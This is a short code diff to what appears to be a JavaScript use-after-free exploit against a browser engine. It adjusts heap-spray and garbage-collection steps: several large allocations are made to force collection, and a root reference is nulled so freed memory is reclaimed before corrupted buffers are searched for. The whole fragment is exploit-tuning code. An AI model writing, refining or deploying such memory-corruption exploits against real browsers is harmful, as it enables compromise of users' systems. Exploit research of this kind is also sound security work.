@@ -12,7 +12,9 @@ const UAF_SIZE = off.size_strimpl + off.js_inline_prop;
 const SPRAY_COUNT = 0x400;
 
 function gc() {
-    new Uint8Array(4 * MB);
+   // new Uint8Array(4 * MB);
+   for (let i = 0; i < 5; i++) new Uint8Array(8 * MB);
+
 }
 
 
@@ -68,6 +70,7 @@ async function main() {
  
   const pre = spray(SPRAY_COUNT, UAF_SIZE);
   const leaked = await doUAF(1600);
+ root = null; 
   gc(); await sleep();
   const buffers = spray(SPRAY_COUNT, UAF_SIZE);
   const {buf, idx} = findCorrupted(buffers);
